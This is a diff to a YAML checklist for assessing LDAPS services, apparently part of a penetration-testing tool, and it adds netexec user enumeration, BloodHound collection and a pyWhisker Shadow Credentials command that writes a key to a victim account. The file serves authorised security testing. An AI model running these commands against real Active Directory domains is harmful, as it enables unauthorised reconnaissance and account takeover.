@@ -13,6 +13,10 @@ checks:
     label: "Inspected LDAPS certificate (CN reveals DC name)"
   - key: ldaps-anonymous-bind
     label: "Tested anonymous bind over LDAPS"
+  - key: ldaps-bloodhound
+    label: "Collected BloodHound data over LDAPS (signing-required envs)"
+  - key: ldaps-shadow-credentials
+    label: "Tested Shadow Credentials (msDS-KeyCredentialLink) for relay path"
 commands:
   - label: "openssl s_client cert grab"
     template: "openssl s_client -connect {IP}:{PORT}"
@@ -20,6 +24,12 @@ commands:
     template: "ldapsearch -H ldaps://{IP}:{PORT} -x -s base -b '' '(objectClass=*)'"
   - label: "nmap LDAPS scripts"
     template: "nmap -p{PORT} --script=ldap-rootdse,ssl-cert {IP}"
+  - label: "netexec ldap over SSL"
+    template: "nxc ldap {IP} -u <user> -p <pass> --port {PORT} --use-ssl --users"
+  - label: "BloodHound collection over LDAPS"
+    template: "bloodhound-python -d EXAMPLE.LOCAL -u <user> -p <pass> -ns {IP} -c All --zip --use-ldaps"
+  - label: "Shadow Credentials add (pyWhisker)"
+    template: "pywhisker.py -d EXAMPLE.LOCAL -u <user> -p <pass> --target <victim> --action add --dc-ip {IP}"
 resources:
   - title: "389,636 - Pentesting LDAP"
     url: "https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap"
